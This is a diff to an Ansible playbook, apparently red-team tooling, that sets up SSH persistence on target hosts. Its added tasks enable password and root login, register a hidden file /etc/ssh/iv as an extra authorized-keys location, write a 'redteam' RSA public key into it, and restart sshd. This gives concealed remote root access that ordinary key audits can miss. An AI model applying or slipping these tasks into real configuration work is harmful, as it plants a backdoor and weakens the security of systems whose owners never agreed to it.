@@ -4,9 +4,35 @@
   become_method: enable
   ignore_errors: true
   tasks:
-    - name: Run a script with arguments (free form)
-      ansible.builtin.script: /home/kali/zonifer/bins/sshKeys.sh
-    - name: Restart service sshd, in all cases
-      ansible.builtin.service:
+    - name: Allow password-based login and permit root login
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: '^PasswordAuthentication .*'
+        line: 'PasswordAuthentication yes'
+
+    - name: Permit root login
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: '^#PermitRootLogin .*'
+        line: 'PermitRootLogin yes'
+
+    - name: Add /etc/sshd/iv as a valid location for authorized keys
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: '^.*AuthorizedKeysFile.*$'
+        line: 'AuthorizedKeysFile /etc/ssh/iv /root/.ssh/authorized_keys /home/%u/.ssh/authorized_keys'
+
+    - name: Write the redteam pubkey to /etc/ssh/iv
+      copy:
+        content: |
+          ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZhA5bPlE7Q2ILlNlL/YI6hTvrZfpM1HyxCH7312PnM4l916KpeSzr7oNXNWUqoU6+OKvq44R+5iRw1dG4eXRl/pm1dZZVGJFLZzZArQi1ZwvSwizEOAN6kDQBqT+Zo3NC3AUdu7zZ3tUCEsa8N64gWqIkgGL7/mtXDgMSUb+xL41TRWiOroiz/Djj016b9weNSSEwRvQK8fKkf6vuua3uejpHdQ/2o2BZA8ITZCS6oikib9UFaXp4A5B9PaBzR5Ha8GhSP6BNcZwt25bT15NsFUXk4WfZjk4/bzQCNzSdv1zqakedbmwNnhxEr+1UytftEw1fmOFTo+hVEc/KldHKKEkO+1tnAFQsJoAwtjFLX5MtZBHzN8Y89jLCf6LMrr3TfjRnB0C2oK/21Z6HK47AjS54ovXUwgNpIG1LtWbj1Nhi6vd+RteH4pIfctG8oTBXFcqwl7gGJsf1HofsVxkAw54RYhdNKHZTaddEH7jzWoq2i0jj9g+0nhYTm85IxQE=
+        dest: /etc/ssh/iv
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Restart ssh service
+      service:
         name: sshd
         state: restarted
+      when: ansible_service_mgr == 'systemd'
